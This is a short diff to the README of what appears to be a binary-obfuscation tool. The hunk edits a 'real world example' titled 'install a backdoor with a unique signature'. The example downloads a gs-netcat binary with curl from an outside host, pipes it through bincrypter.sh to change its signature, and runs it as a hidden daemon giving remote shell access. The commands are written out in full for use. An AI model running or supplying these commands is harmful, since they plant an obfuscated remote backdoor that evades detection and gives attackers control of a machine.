@@ -39,7 +39,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Real world example (install a backdoor with a unique signature):
 ```shell
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | ./bincrypter.sh - >gsnc
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m) | ./bincrypter.sh >gsnc
 chmod +x gsnc
 GS_ARGS="-ilD -s ChangeMe" ./gsnc
 ```
